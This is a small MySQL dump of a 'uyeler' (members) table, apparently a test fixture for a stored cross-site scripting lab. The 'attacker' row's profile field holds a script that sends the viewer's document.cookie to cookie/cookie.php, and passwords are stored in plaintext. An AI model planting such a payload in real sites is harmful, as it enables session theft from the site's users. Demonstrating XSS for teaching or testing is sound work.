Database: test1
Dump of table uyeler
DROP TABLE IF EXISTS `uyeler`;
CREATE TABLE `uyeler` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `kadi` varchar(255) NOT NULL,
  `sifre` varchar(255) NOT NULL,
  `eposta` varchar(255) NOT NULL,
  `hakkinda` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

LOCK TABLES `uyeler` WRITE;
/*!40000 ALTER TABLE `uyeler` DISABLE KEYS */;

INSERT INTO `uyeler` (`id`, `kadi`, `sifre`, `eposta`, `hakkinda`)
VALUES
	(1,'ayberk','123123','ayberkctl@gmail.com','hakkımda'),
	(2,'attacker','evilmesage','attacker@attacker.com','<script>window.location.href = \'cookie/cookie.php?cookie=\' + document.cookie;</script>');
    UNLOCK TABLES;